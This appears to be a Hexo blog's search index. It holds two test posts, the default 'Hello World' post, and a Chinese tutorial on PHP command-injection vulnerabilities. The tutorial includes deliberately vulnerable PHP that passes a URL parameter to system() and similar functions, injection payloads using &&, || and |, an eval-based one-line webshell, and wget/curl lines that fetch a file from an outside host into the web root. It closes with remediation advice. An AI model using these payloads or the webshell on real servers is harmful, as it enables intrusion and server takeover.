<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>test22</title>
    <link href="/2022/10/20/test22/"/>
    <url>/2022/10/20/test22/</url>
    
    <content type="html"><![CDATA[<p>c</p><p>测试图片上传1111</p><p>!!!!!!!!!!!!!!!本地绝对路径!!!!!!!!!!!!!!!</p><p>one</p><p><img src="image-20221020094440688.png" alt="alt"></p><p>two</p><p><img src="image-20221020094536333.png" alt="alt"></p><p>three</p><p><img src="image-20221020094550791.png" alt="alt"></p><p>four</p><p><img src="image-20221020094605774.png" alt="alt"></p><p>five</p><p><img src="image-20221020094613383.png" alt="alt"></p><p>啊啊啊啊啊!!!!!!</p><p>希望可以上传成功</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>zyl-test11</title>
    <link href="/2022/10/18/zyl-test11/"/>
    <url>/2022/10/18/zyl-test11/</url>
    
    <content type="html"><![CDATA[<p>test111测试文件</p><h1 id="the-first-page"><a href="#the-first-page" class="headerlink" title="the first page"></a>the first page</h1><p>32415678490e-qwp[asdklmczx niscdepfkorlmxc bjhjml,.dfrgmt54jrgdfghjasdfghjklqwertyuiop[zxcvbnm,./1234567890-=asdfghjkl;zxcvbnm,./1234567890-]]</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>任意命令执行</title>
    <link href="/2022/10/18/ren-yi-ming-ling-zhi-xing/"/>
    <url>/2022/10/18/ren-yi-ming-ling-zhi-xing/</url>
    
    <content type="html"><![CDATA[<h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><h4 id="命令执行漏洞的概述"><a href="#命令执行漏洞的概述" class="headerlink" title="命令执行漏洞的概述"></a>命令执行漏洞的概述</h4><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。<br>!!!当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。!!!<br></code></pre></td></tr></table></figure><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。<br></code></pre></td></tr></table></figure><h6 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h6><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(args) 有回显<br>passthru(args)(有回显)<br><span class="hljs-keyword">exec</span>(args,$arr)  （回显最后一行-必须echo输出,也可以传递数组显示出来）<br>shell_exec(args) （无回显-必须输出）<br>反引号：<span class="hljs-string">``</span> <br><span class="hljs-keyword">popen</span>(handle,mode)(无回显) ,打开是资源需配合<span class="hljs-keyword">fread</span>读或fget读 <br>proc_open(<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)（无回显）<br>$process = proc_open(<span class="hljs-string">&#x27;dir&#x27;</span>,$des,$pipes);<br>echo stream_get_contents($pipes[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-1-——整个控制"><a href="#System-函数漏洞利用-1-——整个控制" class="headerlink" title="System()函数漏洞利用(1) ——整个控制"></a>System()函数漏洞利用(1) ——整个控制</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arg</span>)&#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$arg</span>&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>/?cmd=id<br>/?cmd=pwd<br>/?cmd=ifconfig<br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-2-——-ping"><a href="#System-函数漏洞利用-2-——-ping" class="headerlink" title="System()函数漏洞利用(2)——-ping"></a>System()函数漏洞利用(2)——-ping</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping  <span class="hljs-subst">$arg</span>&quot;</span>);<br> &#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>  &gt; comm.php   在cmd中写入文件的命令<br><br>&amp;&amp;需要编码(%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>),浏览器不能识别<br><br>?cmd=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>  &gt; he.php<br>    如果双引号被过滤了,使用 ^ 可以代替双引号<br><br><br><br>?cmd=easdych||whoami<br><br>我们能够控制的点是程序的整个参数，我们可以直接用&amp;&amp;或||等等，利用与、或、管道命令来执行其他命令。<br>/?cmd=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>| ifconfig<br><span class="hljs-title function_ invoke__">System</span>(“ping –c <span class="hljs-number">3</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>; ifconfig)<br><br>Llinux 下支持分号 ”;”<br>|，||，%<span class="hljs-number">26</span>，%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>，<br>短路逻辑与  %<span class="hljs-number">26</span>%<span class="hljs-number">26</span> 前后两个参数，如果第一为假，第二个不判断<br>短路逻辑 或 ||前后两个参数，如果第一为真，第二个不判断<br><br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-3-—–查看目录"><a href="#System-函数漏洞利用-3-—–查看目录" class="headerlink" title="System()函数漏洞利用(3)—–查看目录"></a>System()函数漏洞利用(3)—–查看目录</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir \&quot;<span class="hljs-subst">$arg</span>\&quot;&quot;</span>);<br><br>  <span class="hljs-comment">// ls –al “”;ifconfig;”</span><br> &#125;<br><br><br><br>?cmd=./<span class="hljs-string">&quot;%26%26whoami||&quot;</span><br>?cmd=./<span class="hljs-string">&quot;|whoami||&quot;</span><br>    <br>?cmd=/home” ; ifconfig;”<br>?cmd=/home” || ifconfig;”<br>?cmd=/home” %<span class="hljs-number">26</span> ifconfig;”<br>?cmd=/home” %<span class="hljs-number">26</span>%<span class="hljs-number">26</span> ifconfig;”<br><br><br>一个 | --&gt;前面为真,就执行后面的<br></code></pre></td></tr></table></figure><h6 id="短路与逻辑"><a href="#短路与逻辑" class="headerlink" title="短路与逻辑"></a>短路与逻辑</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">短路与&amp;&amp;的特点，前面如果为真，才执行后面的，如果为假，后面不执行。<br><span class="hljs-comment">// 逻辑与&amp;的特点，前面无论真假，后面都执行,并且打印后面的值.</span><br><br><span class="hljs-comment">// 短路或||的特点，前面如果为真，后面的不执行了，前面为假，后面执行</span><br><span class="hljs-comment">// 逻辑或|前面为真，后面都执行,并且打印后面的值.</span><br></code></pre></td></tr></table></figure><h6 id="System-函数漏洞利用-4-—–写文件"><a href="#System-函数漏洞利用-4-—–写文件" class="headerlink" title="System()函数漏洞利用(4)—–写文件"></a>System()函数漏洞利用(4)—–写文件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$arg</span>) &#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo &#x27;<span class="hljs-subst">$arg</span>&#x27; &gt; 1.txt&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27;|whoami||&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">在单引号内的话，变量不能被解析，因此要想执行命令必须闭合单引号。</span><br><span class="hljs-string">/cmd?= 12’|whoami||echo ‘</span><br></code></pre></td></tr></table></figure><h6 id="passthru-exec-shell-exec函数漏洞利用"><a href="#passthru-exec-shell-exec函数漏洞利用" class="headerlink" title="passthru/exec/shell_exec函数漏洞利用"></a>passthru/exec/shell_exec函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);  ---不需要<span class="hljs-keyword">echo</span>,也有回显<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); ----需要<span class="hljs-keyword">echo</span>才有回显,否则没有回显<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$arr</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$arr</span>);---可以用数组方式打印,也可以直接使用var_dump打印<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);---只能<span class="hljs-keyword">echo</span>打印,不能使用数组方式<br>    <br><span class="hljs-keyword">echo</span> `<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`;  ---反引号也可以执行命令,只能<span class="hljs-keyword">echo</span>打印<br></code></pre></td></tr></table></figure><h6 id="proc-open函数漏洞利用"><a href="#proc-open函数漏洞利用" class="headerlink" title="proc_open函数漏洞利用"></a>proc_open函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$des</span> = <span class="hljs-keyword">array</span>(<br>   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// 标准输入，子进程从此管道中读取数据</span><br>   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// 标准输出，子进程向此管道中写入数据</span><br>   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;./error-output.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-comment">// 标准错误，写入到一个文件</span><br>);<br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>], <span class="hljs-variable">$des</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$pipes</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]); ----------只能<span class="hljs-keyword">echo</span>打印<br><span class="hljs-meta">?&gt;</span><br>    <br>    <br>如果有写权限的话<br><span class="hljs-number">1</span>、反弹shell，尝试提权<br><span class="hljs-number">2</span>、执行pwd得到绝对路径，写一句话木马：<br>?cmd=<span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()?^&gt; &gt; /<span class="hljs-keyword">var</span>/www/html/info.php <br>?cmd=wget -O /<span class="hljs-keyword">var</span>/www/html/info.php http:<span class="hljs-comment">//www.xx.com/phpinfo.txt</span><br>?cmd=curl http:<span class="hljs-comment">//www.xx.com/phpinfo.txt &gt; /var/www/html/info.php </span><br><br></code></pre></td></tr></table></figure><p><img src="test22/image-20221013171434912.png" alt="alt"></p><h6 id="popen函数漏洞利用"><a href="#popen函数漏洞利用" class="headerlink" title="popen函数漏洞利用"></a>popen函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>)  ------只能<span class="hljs-keyword">echo</span>打印<br><br><br><span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$f</span> =<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$x</span>,<span class="hljs-number">1024</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$f</span>;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">继承Web服务器程序的权限，去执行系统命令<br>继承Web服务器程序的权限，读写文件 <span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); ?^&gt; &gt; <span class="hljs-number">1</span>.php<br>反弹shell<br>控制整个网站<br>甚至控制整个服务器<br><br></code></pre></td></tr></table></figure><h4 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用。<br>在进入命令执行的函数或方法之前，对参数进行过滤。使用这些函数escapeshellcmd / escapeshellarg过滤<br>escapeshellarg — 把字符串转码为可以在 <span class="hljs-built_in">shell</span> 命令里使用的参数<br>escapeshellcmd  <span class="hljs-built_in">shell</span> 元字符转义<br>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。<br><span class="hljs-built_in">exec</span>() 函数中数据，避免用户可控。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/10/18/hello-world/"/>
    <url>/2022/10/18/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
